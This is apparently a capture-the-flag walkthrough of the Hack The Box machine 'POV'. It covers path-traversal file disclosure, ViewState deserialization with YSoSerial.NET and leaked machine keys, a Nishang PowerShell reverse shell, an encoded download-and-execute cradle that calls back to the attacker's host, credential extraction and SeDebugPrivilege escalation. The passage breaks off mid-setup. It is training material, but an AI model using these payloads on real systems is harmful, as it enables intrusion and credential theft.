---
Primary_category: "[[MEDIUM]]"
title: POV
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
  - Windows
  - HTB
  - HTBMedium
  - WebFuzzing
  - FileDisclosure
  - LFI
  - DirectoryPathTraversal
  - WebConfig
  - ASPNET
  - InsecureObjectDeserialization
  - VIEWSTATE
  - RCE
  - YSoSerialNET
  - PSCredential
  - CLI-XML
  - PortForwarding
  - Chisel
  - seDebugPrivilege
  - PSGetSystem
cssclasses:
---

###### PRIMARY CATEGORY → [[MEDIUM]]

#### *Summary*

- ***Fuzzing web resources with Ffuf***
- ***File Disclosure leads to LFI via Directory Path Traversal***
- ***Leaked web.config file thanks to LFI leads to a Deserialization Attack***
- ***Deserialization: VIEWSTATE Code Injection to gain RCE as the service account running the web application using YSoSerial.NET***
- ***LPE: File Disclosure leads to a plain password extraction from a PSCredential Object stored in a CLI-XML file - $cred.GetNetworkCredential().password***
- ***Local Port Forwarding with Chisel to make the WinRM port accesible***
- ***PE: Abusing seDebugPrivilege to gain RCE as Local System using PSGetSystem.ps1***

![[POV-20260114191535093.webp|400]]

> ***Zoom in***

---

#### *Setup*

Directory creation with the Machine's Name

```bash
mkdir POV && cd !$
```

Creation of a *Pentesting Folder Structure* to store all the information related to the target

```bash
mkdir {Scans,Data,Tools}
```

---

#### *Recon*

##### *OS Identification*

First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*

The standard values are →

- ***About 64 → Linux***
- ***About 128 → Windows***

```bash
ping -c1 10.129.230.183
```

> [!NOTE]- *Command Output*
>
> ```bash
> PING 10.129.230.183 (10.129.230.183) 56(84) bytes of data.
> 64 bytes from 10.129.230.183: icmp_seq=1 ttl=127 time=48.6 ms
> 
> --- 10.129.230.183 ping statistics ---
> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
> rtt min/avg/max/mdev = 48.632/48.632/48.632/0.000 ms
> ```
>

As mentioned, according to the TTL, It seems that It is a ***Windows Target***

##### *Port Scanning*

###### *General Scan*

Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine

The Scan result is exported in a grepable format for subsequent *Port Parsing*

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG POV.allPorts 10.129.230.183
```

> [!BUG]- *POV.allPorts*
>
> ```bash
> # Nmap 7.94SVN scan initiated Tue Jan 13 18:14:44 2026 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG POV.allPorts 10.129.230.183
> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
> Host: 10.129.230.183 ()	Status: Up
> Host: 10.129.230.183 ()	Ports: 80/open/tcp//http///	Ignored State: filtered (65534)
> # Nmap done at Tue Jan 13 18:15:11 2026 -- 1 IP address (1 host up) scanned in 26.45 seconds
> ```
>

**Open Ports →**

```bash
80
```

###### *Comprehensive Scan*

We can apply a little filter to the *POV.allPorts* file to extract the ports and conduct a more comprehensive scan on them by extracting the services and their version running on each port and also executing some default scripts to gather more information

>  ***Note that this scan is also exported to have evidence at hand***

```bash
nmap -p$( grep -ioP --color '\s\d{1,5}(?=/open)' POV.allPorts | xargs | sed 's@\s@,@g' ) -sC -sV -v -n -Pn --disable-arp-ping -oN POV.targeted 10.129.230.183
```

> [!BUG]- *POV.allPorts*
>
> ```bash
> # Nmap 7.94SVN scan initiated Tue Jan 13 18:15:50 2026 as: nmap -p80 -sC -sV -v -n -Pn --disable-arp-ping -oN POV.targeted 10.129.230.183
> Nmap scan report for 10.129.230.183
> Host is up (0.049s latency).
> 
> PORT   STATE SERVICE VERSION
> 80/tcp open  http    Microsoft IIS httpd 10.0
> |_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
> |_http-title: pov.htb
> | http-methods: 
> |   Supported Methods: OPTIONS TRACE GET HEAD POST
> |_  Potentially risky methods: TRACE
> |_http-server-header: Microsoft-IIS/10.0
> Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
> 
> Read data files from: /usr/bin/../share/nmap
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> # Nmap done at Tue Jan 13 18:16:03 2026 -- 1 IP address (1 host up) scanned in 12.87 seconds
> ```
>

##### *80 - HTTP*

This time we only have one *TCP* port to inspect, namely *port 80*

Let's start by enumerating the web technologies running behing the web application hosted on the target

```bash
whatweb http://10.129.230.183
```

> [!NOTE]- *Command Output*
>
> ```bash
> http://10.129.230.183 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sfitz@pov.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.230.183], Microsoft-IIS[10.0], Script, Title[pov.htb], X-Powered-By[ASP.NET]
> ```
>

And we have an email account. Since the domain contains the name of the machine in question, let's add it to the */etc/hosts* file just in case the web server is using *virtual hosting* to offer different content depending on the requested *HTTP Host header*

```bash
printf "%s\t%s" "10.129.230.183" "pov.htb" >> /etc/hosts
```

> [!BUG]- */etc/hosts*
>
> ```bash
> # Host addresses
> 127.0.0.1  localhost
> 127.0.1.1  parrot
> ::1        localhost ip6-localhost ip6-loopback
> ff02::1    ip6-allnodes
> ff02::2    ip6-allrouters
> 
> # Custom Local Lab
> 192.168.1.133   4l3x-pc
> #192.168.1.100   dc01 DC01 dc01.lab.local lab.local
> 192.168.1.142   ws01  ws01.lab.local
> 
> # HTB Machines
> 10.129.230.183	pov.htb
> ```
>

We have to check if the same content is delivered by the web server when a client makes an *HTTP* request to both the *IP Address* and the previous domain

```bash
curl --silent --location --request GET "http://10.129.230.183" | wc -c ; curl --silent --location --request GET "http://pov.htb" | wc -c
```

> [!NOTE]- *Command Output*
>
> ```bash
> 12330
> 12330
> ```
>

And the number of characters is the same, so yes, it is the same content in both cases

Therefore, we will access the following *URL* from the browser to see which web application we are dealing with

```bash
http://pov.htb
```

And we get the following rendered content

![[POV-20260113183308364.webp|350]]

> ***Zoom in***

It appears to be an static website with nothing interesting apart from a contact form located at the bottom of the page

![[POV-20260113190135267.webp|350]]

> ***Zoom in***

The *form* tag does not have any *action* attributes, so the entered data is not sent to any endpoint

Similarly, we can start *Burpsuite* and enable the *intercept* to grab the *HTTP* request in case there is one

But there is not, it does not intercept anything. The *submit* button redirects to the top of the page, so we cannot see anything interesting in the *Network* section of the *Dev Tools*

Anyways, we can confirm that no data is sent to the target

There is nothing interesting in the source code either

The current page we are on is an *index.html*. Again, we can validate this by visiting the following *URL*

```bash
http://pov.htb/index.html
```

The same website is displayed, so we can fuzz for *HTML* resources to see what we can get. The following command will search for directories as well

```bash
ffuf -v -t 200 -w /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt -e '.html ' -u 'http://pov.htb/FUZZ.'
```

> [!NOTE]- *Command Output*
>
> ```bash
> [Status: 301, Size: 142, Words: 9, Lines: 2, Duration: 61ms]
> | URL | http://pov.htb/img
> | --> | http://pov.htb/img/
>     * FUZZ: img
> 
> [Status: 301, Size: 142, Words: 9, Lines: 2, Duration: 49ms]
> | URL | http://pov.htb/css
> | --> | http://pov.htb/css/
>     * FUZZ: css
> 
> [Status: 301, Size: 141, Words: 9, Lines: 2, Duration: 49ms]
> | URL | http://pov.htb/js
> | --> | http://pov.htb/js/
>     * FUZZ: js
> 
> [Status: 301, Size: 142, Words: 9, Lines: 2, Duration: 76ms]
> | URL | http://pov.htb/IMG
> | --> | http://pov.htb/IMG/
>     * FUZZ: IMG
> 
> [Status: 301, Size: 142, Words: 9, Lines: 2, Duration: 118ms]
> | URL | http://pov.htb/CSS
> | --> | http://pov.htb/CSS/
>     * FUZZ: CSS
> 
> [Status: 301, Size: 142, Words: 9, Lines: 2, Duration: 80ms]
> | URL | http://pov.htb/Img
> | --> | http://pov.htb/Img/
>     * FUZZ: Img
> 
> [Status: 301, Size: 141, Words: 9, Lines: 2, Duration: 72ms]
> | URL | http://pov.htb/JS
> | --> | http://pov.htb/JS/
>     * FUZZ: JS
> 
> [Status: 200, Size: 12330, Words: 3740, Lines: 234, Duration: 74ms]
> | URL | http://pov.htb/
>     * FUZZ: 
> 
> :: Progress: [441090/441090] :: Job [1/1] :: 2724 req/sec :: Duration: [0:03:34] :: Errors: 0 ::
> ```
>

Nothing interesting again...

However, if we look at the footer of the website, we see a *subdomain* called *dev.pov.htb*

Before fuzzing for *subdomains* and *virtual hosts*, let's add this *subdomain* to the */etc/hosts* file and access its related *virtual hosts* from the browser

```bash
printf "\t%s" "dev.pov.htb" >> /etc/hosts
```

> [!BUG]- */etc/hosts*
>
> ```bash
> # Host addresses
> 127.0.0.1  localhost
> 127.0.1.1  parrot
> ::1        localhost ip6-localhost ip6-loopback
> ff02::1    ip6-allnodes
> ff02::2    ip6-allrouters
> 
> # Custom Local Lab
> 192.168.1.133   4l3x-pc
> #192.168.1.100   dc01 DC01 dc01.lab.local lab.local
> 192.168.1.142   ws01  ws01.lab.local
> 
> # HTB Machines
> 10.129.230.183	pov.htb dev.pov.htb
> ```
>

And we have another website, the entered *URL* redirects to **`http://dev/pov.htb/portfolio`**

![[POV-20260113193122685.webp|350]]

> ***Zoom in***

Any section of the header send us to different locations on the same page

All appears to be static content again, except for *download* buttom below

![[POV-20260113193504784.webp|350]]

> ***Zoom in***

When the *submit* action is triggered, it calls a *postback javascript* function to send certain data via *HTTP POST* to the server

![[POV-20260113193804441.webp|350]]

> ***Zoom in***

We see that a *file* value is sent along with some *ASP.NET* parameters

---

#### *Exploitation*

##### *File Disclosure*

Whenever we deal with a *VIEWSTATE* *base64-encoded blob*  sent to the server along with another related data such as a *VIEWSTATEGENERATOR* and so on, a *[[VIEWSTATE CODE INJECTION|VIEWSTATE Code Injection]]* must come to mind

This is a *deserialization* attack. A *VIEWSTATE* structure basically contains instantiated classes (objects) on the *server*, which are serialized, encrypted and *MAC-signed*

The two last operations are performed to prevent any manipulation and information disclosure from the client side

As long as I know, a recommended security practice is to configure the *IIS* server to generate the *symmetric keys* used for these cryptographic tasks at runtime. This way, they are not always the same

However, many *web* or *sysadmins* keep these values statically. If so, they are stored in a *web.config* file. This file is similar to an *.htaccess*. It may contains web server and website directives as well as sensitive information such as *passwords*, *tokens*, *keys* and so on

That said, since there is a *file* parameter in the previous *POST* request pointing to a *CV.pdf* file, we could check for a possible *file disclosure* flaw by setting another filename, such as *default.aspx*, which is usually the *index* of an *ASPX* website

![[POV-20260113200538506.webp|350]]

> ***Zoom in***

Here we go! We have a *file disclosure*!

The source code of the *default.aspx* file is displayed. In the first line, we see a reference to a *C#* file that probably contains functions or code structures related to the former

Let's display its content

![[POV-20260113201135521.webp|350]]

> ***Zoom in***

##### *LFI through Directory Path Traversal leads to a Deserialization Attack*

###### *VIEWSTATE Code Injection using YSoSerial.NET*

And we see a declared method that performs string replacement when the provided file contains the string **`../`**, probably to mitigate the risk of an *LFI* via a *Directory Path Traversal*

We can see if there is a *web.config* file in the current working directory before trying with a *Directory Path Traversal*

![[POV-20260113202735741.webp|350]]

> ***Zoom in***

But there is not. Since the target is a *Windows* system, we can easily bypass the above filter by using **`..\`** instead of **`../`**

![[POV-20260113203025654.webp|350]]

> ***Zoom in***

Here it is! We have everything we need to carry out a *VIEWSTATE Code Injection*

- ***Encryption Algorithm***
- ***Decryption Key***
- ***Validation Algorithm***
- ***Validation Key***

From here, we should look for a valid *gadget chain* to achieve remote code execution by serializing, encrypting and *MAC-signing* the provided data, for which we will use the previous *symmetric keys* stored in the *web.config* file

To do so, we will use ***[YSOSerial.net](https://github.com/pwntester/ysoserial.net)***, which makes it easier for us to generate the final serialized payload by selecting the appropiated *gadget chain* along with other specified data

We can run this tool from a *Windows* machine. Let's see examples for the *VIEWSTATE* plugin

```bash
IWR -UseBasicParsing -Uri "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip" -OutFile ".\ysoserial_net.zip"
```

```bash
Expand-Archive -Path '.\ysoserial_net.zip' -DestinatioPath '.\ysoserial.net' -Force
```

```bash
.\ysoserial.net\Release\ysoserial.exe --plugin ViewState --examples
```

> [!NOTE]- *Command Output*
>
> ```bash
> Try 'ysoserial -p ViewState --help' for more information.
> Exmaples:
> 
> .NET Framework >= 4.5:
> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
> 
> .NET Framework <= 4.0 (legacy):
> .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
> 
> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --generator=93D20A1B --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
> 
> .\ysoserial.exe -p ViewState -c "foo to use ActivitySurrogateSelector" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --islegacy --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --isencrypted --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
> ```
>

We can try with the first example, which uses the *TextFormattingRunProperties* gadget

It is necessary to change the value of some parameters. So, the command would be the following after the required replacements

```bash
.\ysoserial.net\Release\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping -n 1 10.10.15.174" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

> [!NOTE]- *Command Output*
>
> ```bash
> DMqCCXa%2BOT3NQRsRHKKeW9NWzk1d7Yx%2BhS9mTg%...<SNIP>...
> ```
>

Remember that we have have extracted those cryptographic values from the *web.config* file thanks to the *LFI* we got earlier

To check if the generated payload works properly, we will attempt to send an *ICMP*  packet with the *ping* command

Therefore, we will use *tcpdump* to filter by *ICMP* packets received from the target

![[POV-20260114164144725.webp|350]]

> ***Zoom in***

```bash
tcpdump --interface tun0 -v -n host 10.129.230.183 and icmp
```

> [!NOTE]- *Command Output*
>
> ```bash
> tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
> 16:41:28.700124 IP (tos 0x0, ttl 127, id 53418, offset 0, flags [none], proto ICMP (1), length 60)
>     10.129.230.183 > 10.10.15.174: ICMP echo request, id 1, seq 8, length 40
> 16:41:28.700158 IP (tos 0x0, ttl 64, id 24160, offset 0, flags [none], proto ICMP (1), length 60)
>     10.10.15.174 > 10.129.230.183: ICMP echo reply, id 1, seq 8, length 40
> ```
>

And we have achieved *Remote Code Execution* through a *deserialization* attack! Which is pretty common to be honest

Take into account that we have managed to serialize our payload by leveraging the *LFI* we found, for which we have had to use a *Directory Path Traversal* bypass

---

#### *Shell as Web User*

From here, we can send a *reverse shell* from the target to our machine. To do so, let's proceed as follows

First, download the *reverse shell* script from the ***[Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)*** repository

```bash
curl --silent --location --request GET "https://github.com/samratashok/nishang/raw/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1" --output rev.ps1
```

And edit it modifying both the *IP Address* and *TCP port*

> [!BUG]- *rev.ps1*
>
> ```bash
> $client = New-Object System.Net.Sockets.TCPClient('10.10.15.174',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```
>

Next, set up both an *HTTP* server to share the above resource and a *TCP* listener on the indicated port

```bash
python3 -m http.server 80
```

```bash
nc -nlvp 1234
```

Finally, create a serialized payload again using the following command

```bash
.\ysoserial.net\Release\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQA3ADQALwByAGUAdgAuAHAAcwAxACcAKQA=" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

> [!NOTE]- *Command Output*
>
> ```bash
> AZI9EDj4Jviva8aRQx2%2Bc%2BzePNGygh6NzFcyYOvFkmKXReDTEvadTtG6vUXjQ9LfPs9dZ0fT3AbEzwK%...<SNIP>...
> ```
>

The *base64-encoded* powershell encoded string contains the following powershell command 

```bash
IEX (New-Object Net.WebClient).downloadString('http://10.10.15.174/rev.ps1')
```

It simply requests the *reverse shell* we are offering after deploying the *HTTP Server* and run the *HTTP response's body content*, which is the script itself

The above command has been propertly encoded by running the following command

```bash
echo -n "IEX (New-Object Net.WebClient).downloadString('http://10.10.15.174/rev.ps1')" | iconv --from-code UTF-8 --to-code UTF-16LE | base64 -w 0
```

> [!NOTE]- *Command Output*
>
> ```bash
> SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQA3ADQALwByAGUAdgAuAHAAcwAxACcAKQA=
> ```
>

Once we have made the *postback* request and sent the custom *VIEWSTATE*, we should recieve the shell on our *TCP* listener

> [!NOTE]- *Command Output*
>
> ```bash
> Listening on 0.0.0.0 1234
> 
> Connection received on 10.129.230.183 49672
> PS C:\windows\system32\inetsrv> 
> PS C:\windows\system32\inetsrv> whoami
> pov\sfitz
> PS C:\windows\system32\inetsrv>
> ```
>

---

#### *Privesc #1*

***Initial Non-Privileged User → POV\SFitz***

##### *File Disclosure: CLI-XML file containing a PSCredential Object*

One thing I like to do when gaining remote access to the target through the *Web Application* on a Window machine, is to check the privileges assigned to the current *access token*

 The service account running the *Web Server* or *Web Application* usually is able to impersonate other local or domain accounts i.e. act on behalf of them, thanks to the *SeImpersonatePrivilege*

As operators, we can leverage this privilege to achive *RCE* as *Local System* using some specific tools that perform certain calls to local *RPC* endpoints

```bash
whoami /priv
```

> [!NOTE]- *Command Output*
>
> ```bash
> PRIVILEGES INFORMATION
> ----------------------
> 
> Privilege Name                Description                    State   
> ============================= ============================== ========
> SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
> SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
> ```
>

But this time we do not have this privilege set in the current access token

Similarly, we can check which groups the current user belongs to

```bash
net user sfitz
```

> [!NOTE]- *Command Output*
>
> ```bash
> User name                    sfitz
> Full Name                    
> Comment                      
> User's comment               
> Country/region code          000 (System Default)
> Account active               Yes
> Account expires              Never
> 
> Password last set            11/6/2023 9:57:24 AM
> Password expires             Never
> Password changeable          11/6/2023 9:57:24 AM
> Password required            Yes
> User may change password     Yes
> 
> Workstations allowed         All
> Logon script                 
> User profile                 
> Home directory               
> Last logon                   1/14/2026 7:30:17 AM
> 
> Logon hours allowed          All
> 
> Local Group Memberships      *Users                
> Global Group memberships     *None                 
> The command completed successfully.
> ```
>

This user account does not belong to any interesting group

Let's list all its home directory recusively

```bash
dir -Recurse -Path 'C:\Users\sfitz'
```

> [!NOTE]- *Command Output*
>
> ```bash
> PS C:\windows\system32\inetsrv> dir -Recurse -Path 'C:\Users\sfitz'
> 
> 
>     Directory: C:\Users\sfitz
> 
> 
> Mode                LastWriteTime         Length Name                                                                  
> ----                -------------         ------ ----                                                                  
> d-r---       10/26/2023   5:02 PM                3D Objects                                                            
> d-r---       10/26/2023   5:02 PM                Contacts                                                              
> d-r---        1/11/2024   6:43 AM                Desktop                                                               
> d-r---       12/25/2023   2:35 PM                Documents                                                             
> d-r---       10/26/2023   5:02 PM                Downloads                                                             
> d-r---       10/26/2023   5:02 PM                Favorites                                                             
> d-r---       10/26/2023   5:02 PM                Links                                                                 
> d-r---       10/26/2023   5:02 PM                Music                                                                 
> d-r---       10/26/2023   5:02 PM                Pictures                                                              
> d-r---       10/26/2023   5:02 PM                Saved Games                                                           
> d-r---       10/26/2023   5:02 PM                Searches                                                              
> d-r---       10/26/2023   5:02 PM                Videos                                                                
> 
> 
>     Directory: C:\Users\sfitz\Documents
> 
> 
> Mode                LastWriteTime         Length Name                                                                  
> ----                -------------         ------ ----                                                                  
> -a----       12/25/2023   2:26 PM           1838 connection.xml                                                        
> 
> 
>     Directory: C:\Users\sfitz\Favorites
> 
> 
> Mode                LastWriteTime         Length Name                                                                  
> ----                -------------         ------ ----                                                                  
> d-r---       10/26/2023   5:02 PM                Links                                                                 
> -a----       10/26/2023   5:02 PM            208 Bing.url                                                              
> 
> 
>     Directory: C:\Users\sfitz\Links
> 
> 
> Mode                LastWriteTime         Length Name                                                                  
> ----                -------------         ------ ----                                                                  
> -a----       10/26/2023   5:02 PM            494 Desktop.lnk                                                           
> -a----       10/26/2023   5:02 PM            935 Downloads.lnk 
> ```
>

And we have a *connection.xml* file in the *Documents* directory

Here we have its content

```bash
Get-Content C:\Users\sfitz\Documents\connection.xml
```

> [!BUG]- *connection.xml*
>
> ```bash
> <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
>   <Obj RefId="0">
>     <TN RefId="0">
>       <T>System.Management.Automation.PSCredential</T>
>       <T>System.Object</T>
>     </TN>
>     <ToString>System.Management.Automation.PSCredential</ToString>
>     <Props>
>       <S N="UserName">alaading</S>
>       <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
>     </Props>
>   </Obj>
> </Objs>
> ```
>

It appears to be a *Powershell* object stored in a *XML* file using the *Export-CLIXML* cmdlet

In this case, the above *secure string* corresponds to the *Alaading* user, which belongs to the *Remote Management Users* group

```bash
net user alaading
```

> [!NOTE]- *Command Output*
>
> ```bash
> User name                    alaading
> Full Name                    
> Comment                      
> User's comment               
> Country/region code          000 (System Default)
> Account active               Yes
> Account expires              Never
> 
> Password last set            11/6/2023 9:59:23 AM
> Password expires             Never
> Password changeable          11/6/2023 9:59:23 AM
> Password required            Yes
> User may change password     Yes
> 
> Workstations allowed         All
> Logon script                 
> User profile                 
> Home directory               
> Last logon                   12/25/2023 3:56:21 PM
> 
> Logon hours allowed          All
> 
> Local Group Memberships      *Remote Management Use*Users                
> Global Group memberships     *None                 
> The command completed successfully.
> 
> ```
>

At the beginning of this assessment, we saw that the only open port was *80 - HTTP*

That is, the *WinRM* service is either not accesible externally, perhaps due to firewall rules, or is not running on the target

We can check if this service is listening on any interface

```bash
Get-NetTCPConnection -State Listen -LocalPort 5985 | fl
```

> [!NOTE]- *Command Output*
>
> ```bash
> LocalAddress   : ::
> LocalPort      : 5985
> RemoteAddress  : ::
> RemotePort     : 0
> State          : Listen
> AppliedSetting : 
> OwningProcess  : 4
> CreationTime   : 1/14/2026 7:17:53 AM
> OffloadState   : InHost
> ```
>

And it is!

So, once we extract the plain text password from the *PSCredential* object stored in the *connection.xml* file, we can gain system access as *alaading* in many different ways

- ***Invoke Command***

```bash
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock '{ <COMMAND> }'
```

- ***[RunAsCS](https://github.com/antonioCoco/RunasCs)***

- ***Upload a [Chisel](https://github.com/jpillora/chisel)*** binary and carry out a *[[PIVOTING, TUNNELING, PORT FORWARDING#Local Port Forwarding|Local Port Forwarding]]* to make the *WinRM* remote port locally accessible

We will opt for the latter to avoid problems related to the next *PE* vector

That said, let's extract the plain password from the *PSCredential* object stored in the *connection.xml CLI-XML* file

To do so, we have to call the *GetNetworkCredential() method* of the *PSCredential* object and extract the value of its *password* attribute

```bash
$cred = Import-CLIXML .\connection.xml
$cred.GetNetworkCredential().password
```

> [!NOTE]- *Command Output*
>
> ```bash
> f8gQ8fynP44ek1m3
> ```
>

Here we go!

Next, let's download both *chisel binaries* for *linux* and *Windows* systems

```bash
curl --silent --location --request GET "https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz" --output chisel.gz
```

```bash
gunzip !$
chmod 700 chisel
```

```bash
curl --silent --location --request GET "https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_amd64.zip" --output chisel.zip
```

```bash
unzip !$
```

Once we have both binaries ready, we must set a *chisel* server locally as follows

```bash
./chisel server --reverse --port 5555
```

> [!NOTE]- *Command Output*
>
> ```bash
> 2026/01/14 18:20:18 server: Reverse tunnelling enabled
> 2026/01/14 18:20:18 server: Fingerprint fxHbGxeZSLZvuNDo/iaje7xszutfDutXP99TLULExQo=
> 2026/01/14 18:20:18 server: Listening on http://0.0.0.0:5555
> ```
>

Then, upload the *Windows chisel* binary to the target and stablish a connection from there to our machine specifying the *WinRM* port

- ***From the Attacker*** ⚔️

```bash
python3 -m http.server 80
```

- ***From the Target*** 🎯

```bash
mkdir C:\Windows\Temp\PE
cd C:\Windows\Temp\PE
```

```bash
certutil.exe -urlcache -split -f http://10.10.15.174/chisel.exe
```

```bash
.\chisel.exe client 10.10.15.174:5555 R:5985:localhost:5985
```

We can now access the *5985* port from *localhost*

```bash
nc -vz localhost 5985
```

> [!NOTE]- *Command Output*
>
> ```bash
> Connection to localhost (::1) 5985 port [tcp/*] succeeded!
> ```
>

We will use ***[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)*** to stablish a *WinRM* session with the target as the *alaading* user account using the previously recovered password

```bash
evil-winrm --ip localhost --user 'alaading' --password 'f8gQ8fynP44ek1m3'
```

> [!NOTE]- *Command Output*
>
> ```bash
> Evil-WinRM shell v3.5
>                                         
> Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
>                                         
> Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
>                                         
> Info: Establishing connection to remote endpoint
> *Evil-WinRM* PS C:\Users\alaading\Documents>
> ```
>

#### *Privesc #2*

***Non-Privileged User → POV\Alaading***

##### *Abusing seDebugPrivilege to gain RCE as Local System*

First, as always, let's check the privileges of the current access token

```bash
whoami /priv
```

> [!NOTE]- *Command Output*
> 
> ```bash
> PRIVILEGES INFORMATION
> ----------------------
> 
> Privilege Name                Description                    State
> ============================= ============================== =======
> SeDebugPrivilege              Debug programs                 Enabled
> SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
> SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
> 
> ```
>

And *seDebugPrivilege* is assigned and enabled. As mentioned previously, it results pretty easy to gain *RCE* as *Local System* by leveraging this privilege

Any process whose access token has been assigned *seDebugPrivilege* can *debug* any *non-protected process*, which means read and write to its memory space, allowing arbitrary code to be executed as the user running the *debugged process*

So, an operator running a process with *seDebugPrivilege* enabled can *attach* to another proccess running as *Local System* and spawn a *child process* of the latter to achieve command execution as this user, thereby gaining access to the system

So, in order to accomplish this task, let's use ***[PSGetSystem](https://github.com/decoder-it/psgetsystem/tree/master)***

Since this is a *powershell script*, we can download it from the target and import it at the same time

- ***From the Attacker*** ⚔️ 

```bash
curl --silent --location --request GET "https://github.com/decoder-it/psgetsystem/raw/refs/heads/master/psgetsys.ps1" --remote-name
```

```bash
python3 -m http.server 80
```

